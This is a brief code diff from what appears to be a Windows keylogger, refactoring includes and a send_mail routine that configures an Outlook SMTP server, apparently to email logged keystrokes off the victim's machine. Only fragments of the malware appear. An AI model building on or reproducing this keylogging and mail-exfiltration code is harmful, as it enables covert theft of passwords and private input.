@@ -5,7 +5,8 @@
 #include "CSmtp.h"
 #include "KeyLogManager.h"
 #include "ServiceManager.h"
-#include "tlhelp32.h" 
+#include "tlhelp32.h"
+#include "Logger.h"
 #include  <io.h>
 #include  <stdio.h>
 #include  <stdlib.h>
@@ -187,7 +188,7 @@ DWORD WINAPI keylog_thread(LPVOID info){
 
 bool send_mail(){
 	char path[512];
-	get_save_path(path);
+	Tool::get_save_path(path);
 	try{
 		CSmtp mail;
 		mail.SetSMTPServer("smtp-mail.outlook.com", 587);
